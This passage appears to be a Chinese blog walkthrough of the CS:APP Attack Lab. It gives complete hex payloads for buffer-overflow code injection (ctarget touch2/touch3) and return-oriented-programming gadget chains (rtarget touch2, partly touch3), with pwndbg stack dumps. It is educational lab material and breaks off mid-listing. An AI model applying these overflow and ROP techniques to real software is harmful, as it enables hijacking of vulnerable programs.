+</span></span><span class=line><span class=cl>  <span class=err>4016</span><span class=nl>c7:</span>	<span class=nf>c7</span> <span class=mi>05</span> <span class=mi>2</span><span class=no>b</span> <span class=mi>2</span><span class=no>e</span> <span class=mi>20</span> <span class=mi>00</span> <span class=mi>02</span> 	<span class=no>movl</span>   <span class=no>$0x2</span><span class=p>,</span><span class=mi>0x202e2b</span><span class=p>(</span><span class=nv>%rip</span><span class=p>)</span>        <span class=c1># 6044fc &lt;vlevel&gt;
+</span></span></span><span class=line><span class=cl>  <span class=err>4016</span><span class=nl>ce:</span>	<span class=err>00</span> <span class=err>00</span> <span class=err>00</span> 
+</span></span><span class=line><span class=cl>  <span class=err>4016</span><span class=nl>d1:</span>	<span class=err>39</span> <span class=err>3</span><span class=nf>d</span> <span class=mi>2</span><span class=no>d</span> <span class=mi>2</span><span class=no>e</span> <span class=mi>20</span> <span class=mi>00</span>    	<span class=no>cmp</span>    <span class=nv>%edi</span><span class=p>,</span><span class=mi>0x202e2d</span><span class=p>(</span><span class=nv>%rip</span><span class=p>)</span>        <span class=c1># 604504 &lt;cookie&gt;
+</span></span></span><span class=line><span class=cl>  <span class=err>4016</span><span class=nl>d7:</span>	<span class=err>74</span> <span class=err>28</span>                	<span class=nf>je</span>     <span class=mh>401701</span> <span class=p>&lt;</span><span class=no>touch2</span><span class=p>+</span><span class=mi>0x40</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>通过调试可以看出来，touch2 中有一个关键的比较，也就是其中 <code>cmp %edi,0x202e2d(%rip)</code>——将第一个参数寄存器 edi 与一个固定的值比较，该值为 0x3d9549ca，也是 cookie 文件中的值。因此，我们要想办法将寄存器 edi 修改为这个值，然后再调用 touch2 代码。</p><p>通过介绍的根据汇编生成字符串序列，可以得出更改 edi 的代码的字节表示：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>bf</span> <span class=no>ca</span> <span class=mi>49</span> <span class=mi>95</span> <span class=mi>3</span><span class=no>d</span>       	<span class=no>mov</span>    <span class=no>$0x3d9549ca</span><span class=p>,</span><span class=nv>%edi</span>
+</span></span></code></pre></td></tr></table></div></div><p>所以，我们需要将最开始的返回值修改为当前栈的位置，而这个位置就是我们希望插入的代码。调试发现栈的位置为 <code>0x55654c98</code>。</p><p>但是，在 mov 代码之外，还需要想办法调用 touch2。注意题目的提示：</p><blockquote><p>不要在攻击代码中使用jmp或call指令。所有的控制转移都要使用ret指令，即使实际上你并不是要从一个函数调用返回。</p></blockquote><p>因此，我们需要在执行完 mov 后，想办法让栈指针 rsp 指向的位置的值变成我们期望跳转的地址，然后运行 ret。<strong>这里需要使用 pushq 推入栈</strong>。</p><p>因此代码注入部分如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>bf ca 49 95 3d       	mov    $0x3d9549ca,%edi
+</span></span><span class=line><span class=cl>68 c1 16 40 00       	push   $0x4016c1
+</span></span><span class=line><span class=cl>c3                   	ret
+</span></span></code></pre></td></tr></table></div></div><p>这些部分占了 11 个字节，之后再填充 13 字节的任意信息，然后再是初始返回值的位置。因此完整的十六进制字符串如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>bf ca 49 95 3d 68 c1 16
+</span></span><span class=line><span class=cl>40 00 c3 00 00 00 00 00 
+</span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>98 4c 65 55 00 00 00 00 
+</span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span></code></pre></td></tr></table></div></div><p>进入调试，可以看到运行 gets 后，栈信息如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00:0000│ rax rsp 0x55654c98 ◂— movl $0x3d9549ca, %edi 
+</span></span><span class=line><span class=cl>01:0008│         0x55654ca0 ◂— addb %al, %bl /* 0xc30040; &#39;@&#39; */
+</span></span><span class=line><span class=cl>02:0010│         0x55654ca8 ◂— 0
+</span></span><span class=line><span class=cl>03:0018│         0x55654cb0 —▸ 0x55654c98
+</span></span></code></pre></td></tr></table></div></div><p>这里其实 pwndbg 对于 0x55654ca0 处解释成了另外的操作，运行起来会发现是没有问题的。当函数通过 0x55654cb0 返回后，rip 跳转到 0x55654c98 位置（当前 rsp 位置），信息如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0x55654c98    movl   $0x3d9549ca, %edi     EDI =&gt; 0x3d9549ca
+</span></span><span class=line><span class=cl>0x55654c9d    pushq  $touch2
+</span></span><span class=line><span class=cl>0x55654ca2    retq
+</span></span></code></pre></td></tr></table></div></div><p>这正是我们期望注入的代码。之后 ret 会正确跳转到 touch2 的位置。完成了 ctarget 的第二部分。</p><h2 id=ctarget-touch3>ctarget-touch3</h2><p>touch3 代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>touch3</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>sval</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>vlevel</span> <span class=o>=</span> <span class=mi>3</span><span class=p>;</span>       <span class=cm>/* Part of validation protocol */</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>hexmatch</span><span class=p>(</span><span class=n>cookie</span><span class=p>,</span> <span class=n>sval</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Touch3!: You called touch3(</span><span class=se>\&#34;</span><span class=s>%s</span><span class=se>\&#34;</span><span class=s>)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>sval</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>validate</span><span class=p>(</span><span class=mi>3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Misfire: You called touch3(</span><span class=se>\&#34;</span><span class=s>%s</span><span class=se>\&#34;</span><span class=s>)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>sval</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>fail</span><span class=p>(</span><span class=mi>3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>这一关需要我们注入一个合适的字符串，并且修改寄存器 edi 为指向字符串的指针。</p><p>首先如法炮制，在 getbuf 中修改返回的地址，跳转到 touch3。此时对应十六进制为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>ad 17 40 00 00 00 00 00
+</span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span></code></pre></td></tr></table></div></div><p>调试可以发现此时栈的结构：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00:0000│ rax rsp 0x55654c98 ◂— 0
+</span></span><span class=line><span class=cl>... ↓            2 skipped
+</span></span><span class=line><span class=cl>03:0018│         0x55654cb0 —▸ 0x4017ad (touch3) ◂— pushq %rbx
+</span></span><span class=line><span class=cl>04:0020│         0x55654cb8 ◂— 0
+</span></span><span class=line><span class=cl>05:0028│         0x55654cc0 —▸ 0x401d00 (launch+55) ◂— hlt
+</span></span></code></pre></td></tr></table></div></div><p>我们修改的就是 0x55654cb0。注意，如果需要存储字符串，需要放在该地址的“更低处”（这里“低”仅仅形容上面栈的示意结构，栈是从地址高到地址低的，也就是要放在更高地址的地方），后面 touch3、 hexmatch 等函数都会拓展栈，导致覆盖原先字符串。例如，单步调试进入 hexmatch 函数，发现栈变成这样：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00:0000│ rsp 0x55654c90 —▸ 0x6062a0 ◂— 0xfbad2488
+</span></span><span class=line><span class=cl>01:0008│     0x55654c98 —▸ 0x55685fe8 —▸ 0x402c5e ◂— pushq $0x3a6971 /* &#39;hqi:&#39; */
+</span></span><span class=line><span class=cl>02:0010│     0x55654ca0 ◂— 3
+</span></span><span class=line><span class=cl>03:0018│     0x55654ca8 —▸ 0x4017c9 (touch3+28) ◂— testl %eax, %eax
+</span></span><span class=line><span class=cl>04:0020│     0x55654cb0 —▸ 0x55586000 ◂— 0
+</span></span><span class=line><span class=cl>05:0028│     0x55654cb8 ◂— 0
+</span></span><span class=line><span class=cl>06:0030│     0x55654cc0 —▸ 0x401d00 (launch+55) ◂— hlt
+</span></span></code></pre></td></tr></table></div></div><p>从 0x55654cb0 到 0x55654c90 部分都会被覆盖，之后还会额外开拓 7 * 16 的地址。所以，字符串应该放在 0x55654cb8 这种位置。</p><p>通过 ascii 对应关系，可知 cookie 0x3d9549ca对应的十六进制为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>33 64 39 35 34 39 63 61
+</span></span></code></pre></td></tr></table></div></div><p>现在输入改为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>ad 17 40 00 00 00 00 00
+</span></span><span class=line><span class=cl>33 64 39 35 34 39 63 61
+</span></span><span class=line><span class=cl>00
+</span></span></code></pre></td></tr></table></div></div><p>调试可以发现，调用 gets 后，栈的结构如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00:0000│ rax rsp 0x55654c98 ◂— 0
+</span></span><span class=line><span class=cl>... ↓            2 skipped
+</span></span><span class=line><span class=cl>03:0018│         0x55654cb0 —▸ 0x4017ad (touch3) ◂— pushq %rbx
+</span></span><span class=line><span class=cl>04:0020│         0x55654cb8 ◂— xorl 0x35(%rcx, %rdi), %esp /* 0x6163393435396433; &#39;3d9549ca&#39; */
+</span></span></code></pre></td></tr></table></div></div><p>这时候 0x55654cb8 对应的字符串就是 3d9549ca，下一位是 0x00，所以这个字符串拥有一个终止符。</p><p>之后，仿照 touch2 如法炮制，将 edi 修改为 0x55654cb8 即可。汇编代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>bf</span> <span class=no>b8</span> <span class=mi>4</span><span class=no>c</span> <span class=mi>65</span> <span class=mi>55</span>       	<span class=no>mov</span>    <span class=no>$0x55654cb8</span><span class=p>,</span><span class=nv>%edi</span>
+</span></span><span class=line><span class=cl><span class=err>68</span> <span class=nf>ad</span> <span class=mi>17</span> <span class=mi>40</span> <span class=mi>00</span>       	<span class=no>push</span>   <span class=no>$0x4017ad</span>
+</span></span><span class=line><span class=cl><span class=nf>c3</span>                   	<span class=no>ret</span>
+</span></span></code></pre></td></tr></table></div></div><p>所以我们最终注入的十六进制形式如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>bf b8 4c 65 55 68 ad 17
+</span></span><span class=line><span class=cl>40 00 c3 00 00 00 00 00
+</span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>98 4c 65 55 00 00 00 00
+</span></span><span class=line><span class=cl>33 64 39 35 34 39 63 61
+</span></span><span class=line><span class=cl>00
+</span></span></code></pre></td></tr></table></div></div><p>这当中：</p><ul><li>第一行与第二行是三句汇编代码，目的是修改 edi 寄存器，并且进入到 touch3 函数；</li><li>第四行修改了 getbuf 函数的返回地址，变成了返回到栈上的位置，进而执行注入的脚本；</li><li>第五行是插入的字符串。</li></ul><h2 id=rtarget-touch2>rtarget-touch2</h2><p>从这一关开始，程序变成了 rtarget，而不是 ctarget，增加了难度：</p><ul><li>采用随机化，每次运行时栈的位置不同，无法将代码注入到栈上写死的位置；</li><li>栈的区域不可执行，就算跳转到该区域也会段错误。</li></ul><p>这导致需要使用面向结果的编程，也就是利用反汇编中的特定编码（gadget），来执行操作。这一关卡只能使用 start_farm（0x401844） 与end_farm（0x401961） 之间的函数。</p><p>该阶段需要完成之前 touch2 一样的任务——修改 edi 寄存器为 0x3d9549ca，然后调用 touch2 代码。并且，只能使用两个 gadget。</p><p>提示说到使用 popq，可以从栈中弹出数据，这样我们当前 rsp 指向的位置的值会写入寄存器，同时也会改变栈的位置，可以进行跳转操作。</p><p>我们希望将值写入 edi，即 popq edi（rdi），对应的命令为 5f，但是经过搜索，我们发现并不存在。搜索其他的 58 到 5e 指令（都是 popq），发现只有 58 指令存在，并且很多。我们在执行 58 指令后，需要返回，也就是紧跟着 c3，查询后发现下面的片段：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>000000000040185f &lt;setval_219&gt;:
+</span></span><span class=line><span class=cl>  40185f:	c7 07 98 d2 58 c3    	movl   $0xc358d298,(%rdi)
+</span></span><span class=line><span class=cl>  401865:	c3                   	ret
+</span></span></code></pre></td></tr></table></div></div><p>其 58 c3 序列开始的地址为 0x401863 （在 0x40185f 的基础上加4），这就是第一个需要的地址。</p><p>在执行 popq rax 后，接下来再将 rax 的值写入 rdi，也就是 movq rax rdi。</p><p>这两个命令都需要有89 c7，再加上末尾的 c3 返回指令，序列位 89 c7 c3，存在两个：</p><ul><li>setval_422</li><li>setval_246</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0000000000401858 &lt;setval_422&gt;:
+</span></span><span class=line><span class=cl>  401858:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
+</span></span><span class=line><span class=cl>  40185e:	c3                   	ret
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>0000000000401866 &lt;setval_246&gt;:
+</span></span><span class=line><span class=cl>  401866:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
+</span></span><span class=line><span class=cl>  40186c:	c3                   	ret
+</span></span></code></pre></td></tr></table></div></div><p>选取其中 setval_422，对应地址为 0x40185a（理论上从 0x40185b 处开始也可以，就是 movq 与 movl 的区别，没有影响）。</p><p>现在要想办法更改栈的返回地址，进而达成效果。栈原先返回位置肯定是到达第一个 gadget 的位置，然后再下面是 cookie 的值，这样使用 popq 进入寄存器。最后是第二个 gadget 的位置。</p><p>尝试如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>63 18 40 00 00 00 00 00
+</span></span><span class=line><span class=cl>ca 49 95 3d 00 00 00 00
+</span></span><span class=line><span class=cl>5a 18 40 00 00 00 00 00
+</span></span></code></pre></td></tr></table></div></div><p>这里第四行是在 getbuf 中执行 ret 时候，rsp 指向的位置，跳转到第一个 gadget，同时 rsp 指向下一行。接着第一个 gadget 执行 popq rax，将 cookie 值写入 rax，同时 rsp 执行下一行。再执行 ret，跳转到第二个gadget。</p><p>进入 gets 前栈的形态（这里的地址都是随机的，所以不一样。重要的是最左侧的相对关系）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00:0000│ rsp 0x7ffffffc2950 ◂— 0
+</span></span><span class=line><span class=cl>01:0008│     0x7ffffffc2958 ◂— 0
+</span></span><span class=line><span class=cl>02:0010│     0x7ffffffc2960 —▸ 0x7fffffffe108
+</span></span><span class=line><span class=cl>03:0018│     0x7ffffffc2968 —▸ 0x401829 (test+14)
+</span></span><span class=line><span class=cl>04:0020│     0x7ffffffc2970 ◂— 7
+</span></span><span class=line><span class=cl>05:0028│     0x7ffffffc2978 —▸ 0x401e35 (launch+73)
+</span></span></code></pre></td></tr></table></div></div><p>更改后：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00:0000│ rax rsp 0x7ffffffc2950 ◂— 0
+</span></span><span class=line><span class=cl>... ↓            2 skipped
+</span></span><span class=line><span class=cl>03:0018│         0x7ffffffc2968 —▸ 0x401863 (setval_219+4) ◂— popq %rax
+</span></span><span class=line><span class=cl>04:0020│         0x7ffffffc2970 ◂— 0x3d9549ca
+</span></span><span class=line><span class=cl>05:0028│         0x7ffffffc2978 —▸ 0x40185a (setval_422+2)
+</span></span></code></pre></td></tr></table></div></div><p>在 getbuf 中会对 rsp 减小 0x18，rsp 指向 setval_219+4 的位置。然后执行 ret 后，栈如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00:0000│ rsp 0x7ffffffc2970 ◂— 0x3d9549ca
+</span></span><span class=line><span class=cl>01:0008│     0x7ffffffc2978 —▸ 0x40185a (setval_422+2)
+</span></span></code></pre></td></tr></table></div></div><p>现在会执行 popq rax，将 rax 变成期望的 cookie，同时 rsp 执行了下面的 setval_422+2。执行 retq，函数跳转到第二个 gadget，执行 movq %rax, %rdi。</p><p>但是，如果只是刚刚的修改，因为这时候栈指向的地方都没有内容，会跳转到随机地址，导致段错误。因此还需要进一步修改，跳转到 touch2 0x4016c1。最终十六进制如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>63 18 40 00 00 00 00 00
+</span></span><span class=line><span class=cl>ca 49 95 3d 00 00 00 00
+</span></span><span class=line><span class=cl>5a 18 40 00 00 00 00 00
+</span></span><span class=line><span class=cl>c1 16 40 00 00 00 00 00
+</span></span></code></pre></td></tr></table></div></div><p>这样就完成了 rtarget touch2。</p><h2 id=rtarget-touch3>rtarget-touch3</h2><p>这一关需要使用更多 gadget，修改 edi 寄存器为一个指向字符串的指针，然后调用 touch3 函数。指南说该部分允许使用这些汇编命令（实际上后面发现还需要别的）：</p><ul><li>movq</li><li>movl</li><li>ret</li><li>nop</li><li>单字节操作<ul><li>andb</li><li>orb</li><li>cmpb</li><li>testb</li></ul></li></ul><p>我们的字符串肯定是放在栈上面的，因此需要想办法得到字符串的地址，需要涉及到栈指针 rsp，将 rsp 的值读入寄存器。搜寻 movq rsp 相关指令，发现都以 48 89 e 开头，最后一个数是 0-7。搜索发现只存在 48 89 e0。我们还需要后面跟着返回或者空，经过搜索有 setval_232、addval_479 符合条件。这里使用 setval_232：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0000000000401919 &lt;setval_232&gt;:
+</span></span><span class=line><span class=cl>  401919:	c7 07 c8 48 89 e0    	movl   $0xe08948c8,(%rdi)
+</span></span><span class=line><span class=cl>  40191f:	c3                   	ret
+</span></span></code></pre></td></tr></table></div></div><p>该指令将 rsp 放入 rax，地址为 0x40191c。</p><p>但是，仅仅靠这些指令不足以完成加法操作。所以，还是要使用其它代码，例如可以在 gadget 中发现这个：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0000000000401887 &lt;add_xy&gt;:
+</span></span><span class=line><span class=cl>  401887:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+</span></span><span class=line><span class=cl>  40188b:	c3                   	ret
+</span></span></code></pre></td></tr></table></div></div><p>该函数的功能是将 rdi 与 rsi 相加，放入 rax，这正是我们需要的加法。</p><p>为了调用它，需要想办法将刚刚放入 rax 的值转移到 rdi 或者 rsi，搜索相关 gadget 48 89 c，发现只有 48 89 c7 满足条件，也就是放入 rdi 寄存器，有两个 setval_422、setval_246，这里选择前者：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0000000000401858 &lt;setval_422&gt;:
+</span></span><span class=line><span class=cl>  401858:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
+</span></span><span class=line><span class=cl>  40185e:	c3                   	ret
+</span></span></code></pre></td></tr></table></div></div><p>所以，接下来需要将某个偏移量常数放入 rsi。可以仿照 r-touch2 的思路，使用 popq 将期望的值写入寄存器，当前 gadget 中所有相关函数中也只有 58，即 popq $rax，如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>000000000040185f &lt;setval_219&gt;:
+</span></span><span class=line><span class=cl>  40185f:	c7 07 98 d2 58 c3    	movl   $0xc358d298,(%rdi)
+</span></span><span class=line><span class=cl>  401865:	c3                   	ret
+</span></span></code></pre></td></tr></table></div></div><p>地址为 0x401863，同 r-touch2。</p><p>之后需要将该值放入 rsi。但是我们发现 movq 指令中，rax 还是只能移动到 rdi，而 rdi 无法移动到别的寄存器。</p><p>这时候更改思路，考虑使用 movl，因为此时是一个很小的常数，所以32位还是64位没有影响。搜索 89 c 开头，发现满足 0-6 要求的只有 89 c1（如果是 89 c7，那么还是移动到了 edi，不行）。</p><p>初看下来，并不存在 89 c1 c3，也就是不直接跟着返回值。但是，考虑到之前提供的一些多余代码，也就是对单位进行操作但不影响其他结果的运算，发现有下属条件满足</p><ul><li>getval_201，20 d2 表示 andb dl, dl</li><li>setval_231，08 db 表示 orb bl, bl</li></ul><p>这里选择前者，地址为 0x401921，目的是将 eax 放入 ecx：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0000000000401920 &lt;getval_201&gt;:
+</span></span><span class=line><span class=cl>  401920:	b8 89 c1 20 d2       	mov    $0xd220c189,%eax
+</span></span><span class=line><span class=cl>  401925:	c3                   	ret
+</span></span></code></pre></td></tr></table></div></div><p>继续搜索 ecx 如何转移，也就是 89 c 开头，8-f。发现存在许多 89 ca，将 ecx 放入 edx。如法炮制，找到一个合理的 gadget：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00000000004018a1 &lt;addval_245&gt;:
+</span></span><span class=line><span class=cl>  4018a1:	8d 87 89 ca 20 c0    	lea    -0x3fdf3577(%rdi),%eax
+</span></span><span class=line><span class=cl>  4018a7:	c3                   	ret
+</span></span></code></pre></td></tr></table></div></div><p>这当中 89 ca 后面的 20 c0 代表 andb %al, %al。地址为 0x4018a3。</p><p>继续搜索 edx，也就是 89 d 开头，0-7，发现存在 89 d6，也就是放入 esi，终于达成了目标（除了 getval_301 之外还存在 setval_222，任选一个即可）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00000000004018c9 &lt;getval_301&gt;:
